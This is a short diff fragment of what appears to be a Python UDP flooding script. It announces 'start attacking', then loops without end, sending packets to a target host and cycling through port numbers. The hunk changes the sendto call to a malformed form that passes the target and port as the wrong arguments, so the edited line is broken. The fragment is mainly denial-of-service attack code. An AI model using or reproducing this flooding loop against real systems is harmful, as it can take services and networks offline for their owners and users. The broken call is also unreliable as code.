@@ -44,7 +44,7 @@ print (grn + "[====================] Now 100% Completed to start attacking" + gr
 time.sleep(3)
 send = 0
 while True:
-     reg.sendto(load, (rt,hack))
+     reg.sendto(load,rt,hack)
      send = send + 1
      hack = hack + 1
      print ("sends %s the packet  %s through port:%s"%(send,rt,hack))
